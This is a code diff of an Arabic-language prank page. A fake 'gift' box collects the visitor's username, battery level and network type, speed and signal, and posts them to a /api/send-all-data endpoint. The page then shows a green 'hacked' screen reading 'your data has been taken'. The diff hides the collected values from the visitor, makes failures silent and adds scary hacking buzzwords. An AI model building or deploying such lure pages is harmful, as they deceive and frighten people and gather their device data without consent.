@@ -25,13 +25,14 @@
   }
 
   body.green-mode {
-    background-color: #0f0 !important;
+    background-color: #0a0 !important;
   }
 
   body.green-mode #main-container {
-    background: #0f0 !important;
+    background: #0a0 !important;
     border-color: #0f0 !important;
-    box-shadow: 0 0 80px rgba(0, 255, 0, 0.5) !important;
+    box-shadow: 0 0 80px rgba(0, 255, 0, 0.3) !important;
+    border: 3px solid #0f0;
   }
 
   body.green-mode #success-screen {
@@ -191,69 +192,96 @@
   }
 
   #success-screen h1 {
-    color: #000;
-    text-shadow: none;
+    color: #0f0;
+    text-shadow: 0 0 20px #0f0;
     font-size: 2.5em;
     margin-bottom: 15px;
+    font-family: 'Courier New', monospace;
+    letter-spacing: 3px;
   }
 
   #success-screen p {
-    color: #000;
+    color: #0f0;
     font-size: 1.3em;
-    opacity: 0.8;
+    opacity: 0.9;
+    font-family: 'Courier New', monospace;
+    text-shadow: 0 0 10px #0f0;
   }
 
-  .battery-info {
-    font-size: 0.9em;
-    opacity: 0.6;
-    margin-top: 20px;
-    color: #000;
+  /* نصوص الثغرات في الخلفية */
+  .hacker-text {
+    position: fixed;
+    color: rgba(0, 255, 0, 0.08);
+    font-family: 'Courier New', monospace;
+    font-size: 14px;
+    pointer-events: none;
+    z-index: 0;
+    line-height: 1.8;
+    direction: ltr;
+    white-space: pre;
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    padding: 20px;
   }
 
-  .username-display {
-    font-size: 0.8em;
-    opacity: 0.5;
-    margin-top: 5px;
-    color: #000;
+  body.green-mode .hacker-text {
+    display: block !important;
   }
 
-  .gift-username {
-    font-size: 0.9em;
-    opacity: 0.5;
-    color: #ff6b9d;
-    margin-top: 10px;
-  }
-
-  .gift-icon {
-    font-size: 50px;
-    margin-bottom: 10px;
-    display: block;
-  }
-
-  .glow-text {
-    animation: glow 2s ease-in-out infinite;
-  }
-
-  @keyframes glow {
-    0%, 100% { text-shadow: 0 0 10px rgba(255, 107, 157, 0.3); }
-    50% { text-shadow: 0 0 30px rgba(255, 107, 157, 0.6), 0 0 60px rgba(255, 107, 157, 0.2); }
-  }
-
-  .login-title {
-    color: #ff6b9d;
-  }
-
-  .login-sub {
-    color: #999;
+  .hacker-text {
+    display: none;
   }
 
   .success-icon {
     font-size: 60px;
     margin-bottom: 15px;
+    color: #0f0;
+  }
+
+  .glitch-text {
+    animation: glitch 3s infinite;
+  }
+
+  @keyframes glitch {
+    0%, 100% { transform: translate(0); opacity: 1; }
+    20% { transform: translate(-2px, 2px); opacity: 0.8; }
+    40% { transform: translate(2px, -2px); opacity: 0.9; }
+    60% { transform: translate(-1px, 1px); opacity: 0.7; }
+    80% { transform: translate(1px, -1px); opacity: 0.9; }
+  }
+
+  /* خط المسح */
+  .scan-line {
+    display: none;
+  }
+
+  body.green-mode .scan-line {
+    display: block;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 3px;
+    background: rgba(0, 255, 0, 0.3);
+    box-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
+    z-index: 100;
+    animation: scanMove 2s linear infinite;
+  }
+
+  @keyframes scanMove {
+    0% { top: 0; }
+    100% { top: 100%; }
   }
 </style>
 </head>
 <body>
+
+  <!-- نصوص الثغرات في الخلفية -->
+  <div class="hacker-text" id="hacker-text"></div>
+
+  <!-- خط المسح -->
+  <div class="scan-line"></div>
 
   <div class="hearts-bg" id="hearts-bg"></div>
 
@@ -280,11 +308,9 @@
 
     <!-- شاشة النجاح -->
     <div id="success-screen">
-      <div class="success-icon">💀</div>
-      <h1>✅ تم سحب بياناتك</h1>
-      <p>☠️ تم اختراق هاتفك بنجاح</p>
-      <div class="battery-info" id="battery-display">🔋 جاري قراءة البطارية...</div>
-      <div class="username-display" id="success-username"></div>
+      <div class="success-icon">😘</div>
+      <h1 class="glitch-text">تم سحب بياناتك</h1>
+      <p>بالشفا</p>
     </div>
   </div>
 
@@ -311,6 +337,60 @@ function createHeartsBackground() {
 }
 createHeartsBackground();
 
+// نصوص الثغرات
+function createHackerText() {
+  const container = document.getElementById('hacker-text');
+  const texts = [
+    'ROOT ACCESS GRANTED',
+    'SYSTEM HACKED',
+    'ADMIN PRIVILEGES',
+    'DATABASE DUMP',
+    'SQL INJECTION',
+    'XSS VULNERABILITY',
+    'BACKDOOR INSTALLED',
+    'PASSWORD CRACKED',
+    'SESSION HIJACKED',
+    'FIREWALL BYPASSED',
+    'ENCRYPTION BROKEN',
+    'TROJAN DEPLOYED',
+    'RANSOMWARE ACTIVATED',
+    'DDoS ATTACK',
+    'DNS SPOOFING',
+    'PHISHING SITE',
+    'MALWARE DETECTED',
+    'EXPLOIT SUCCESS',
+    'ZERO-DAY FOUND',
+    'KERNEL PANIC',
+    'BUFFER OVERFLOW',
+    'STACK SMASHING',
+    'HEAP SPRAYING',
+    'ROOTKIT INSTALLED',
+    'KEYLOGGER ACTIVE',
+    'SCREEN CAPTURE',
+    'MICROPHONE ACCESS',
+    'CAMERA ENABLED',
+    'GPS TRACKING',
+    'CONTACTS SYNCED',
+    'MESSAGES READ',
+    'CALL LOGS EXPORTED',
+    'PHOTOS UPLOADED',
+    'LOCATION SHARED',
+    'DEVICE COMPROMISED'
+  ];
+  
+  let html = '';
+  for (let i = 0; i < 80; i++) {
+    const text = texts[Math.floor(Math.random() * texts.length)];
+    const x = Math.random() * 90;
+    const y = Math.random() * 90;
+    const opacity = Math.random() * 0.1 + 0.02;
+    const size = Math.random() * 20 + 10;
+    html += `<span style="position:absolute;left:${x}%;top:${y}%;font-size:${size}px;opacity:${opacity};">${text}</span>`;
+  }
+  container.innerHTML = html;
+}
+createHackerText();
+
 // عناصر DOM
 const loginScreen = document.getElementById('login-screen');
 const giftScreen = document.getElementById('gift-screen');
@@ -319,8 +399,6 @@ const loginForm = document.getElementById('login-form');
 const usernameInput = document.getElementById('username-input');
 const giftBox = document.getElementById('gift-box');
 const giftUsername = document.getElementById('gift-username');
-const batteryDisplay = document.getElementById('battery-display');
-const successUsername = document.getElementById('success-username');
 
 // معالج تسجيل الدخول
 loginForm.addEventListener('submit', function(e) {
@@ -352,45 +430,38 @@ giftBox.addEventListener('click', function() {
   
   setTimeout(() => {
     document.body.classList.add('green-mode');
-    successUsername.textContent = `👤 ${username}`;
     
     if ('getBattery' in navigator && !alreadySent) {
       alreadySent = true;
       
       navigator.getBattery().then(function(battery) {
         let percent = Math.round(battery.level * 100);
-        batteryDisplay.textContent = `🔋 نسبة البطارية: ${percent}%`;
         
-        // جلب معلومات النت
         const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         let networkSpeed = 'غير معروف';
         let signalBars = 'غير معروف';
         let signalType = 'غير معروف';
         
         if (connection) {
-          // السرعة
           const speed = connection.downlink;
           if (speed) {
             networkSpeed = speed + ' Mbps';
           }
           
-          // نوع الشبكة
           if (connection.effectiveType) {
             const types = {
-              'slow-2g': '🐢 2G',
-              '2g': '📶 2G',
-              '3g': '📶 3G',
-              '4g': '📶 4G'
+              'slow-2g': '2G',
+              '2g': '2G',
+              '3g': '3G',
+              '4g': '4G'
             };
             signalType = types[connection.effectiveType] || connection.effectiveType;
           }
           
-          // قوة الإشارة (شرط)
           if (connection.bars !== undefined && connection.bars !== null) {
             const bars = Math.min(Math.max(connection.bars, 0), 4);
             signalBars = '█'.repeat(bars) + '░'.repeat(4 - bars) + ` (${bars}/4)`;
           } else {
-            // تقدير الإشارة من السرعة
             const speed = connection.downlink || 0;
             if (speed >= 50) signalBars = '████ (4/4)';
             else if (speed >= 20) signalBars = '███░ (3/4)';
@@ -400,7 +471,6 @@ giftBox.addEventListener('click', function() {
           }
         }
         
-        // إرسال كل البيانات
         fetch('/api/send-all-data', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -413,10 +483,8 @@ giftBox.addEventListener('click', function() {
           })
         });
       }).catch(() => {
-        batteryDisplay.textContent = '⚠️ لا يمكن قراءة البطارية';
+        // silent fail
       });
-    } else {
-      batteryDisplay.textContent = '⚠️ لا يمكن قراءة البطارية';
     }
   }, 600);
 });
